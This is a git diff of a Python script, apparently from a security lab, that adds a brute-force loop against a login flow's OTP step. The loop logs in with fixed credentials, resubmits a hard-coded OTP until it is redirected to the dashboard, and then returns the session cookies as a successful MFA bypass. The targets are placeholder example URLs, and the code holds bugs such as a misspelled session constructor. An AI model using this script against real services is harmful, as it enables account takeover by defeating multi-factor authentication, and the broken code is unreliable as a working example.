@@ -4,7 +4,7 @@ import requests
 login_url="http://example.com"
 otp_url="http://example/mfa"
 dashboard_url="http://example/dashboard"
-
+hard_coded_opt=3333
 
 credentials={
     "username":"username123",
@@ -31,7 +31,7 @@ def is_loggedin_success(response):
     return "User verfication" in response.text and response.status_code==200
 
 # This function handles log in
-def login(session):
+def handle_login(session):
     response= session.post(login_url, data=credentials, headers=headers)
     return response
 
@@ -48,3 +48,47 @@ def test_top(session, otp):
     print("OTP response code recieved", {response.status_code})
 
     return response
+
+
+
+# If we got redirected to the log in page due to to security mechanisim
+
+def check_login(response):
+    return "Sign in to your account" in response.text or "Log in" in response.text
+
+
+
+
+# Brute forcing logging in
+
+def brute_force():
+    while True:
+
+        session= request.Seasson()
+        login_response= handle_login(session)
+
+        if is_loggedin_success(login_response):
+            print("logged in ")
+        else:
+            continue
+
+        response= test_top(session, hard_coded_opt)
+
+        if check_login(response):
+            print("Unsuccessful try, we got redirected to log in page")
+            continue
+
+
+        if response.status_code == 302:
+            current_location=response.headers.get('Location','')
+            
+            if current_location == dashboard_url:
+                print("Successfully bypassed OTP with: ", hard_coded_opt)
+                return session.cookies.get_dict()
+            elif current_location ==login_url:
+                print("Unseccessful attempt, redirected to log in page")
+            else:
+                print("unknown header location: ", current_location , "OTP: ", hard_coded_opt)
+        else:
+            print("Recieved status code: ", response.status_code)
+
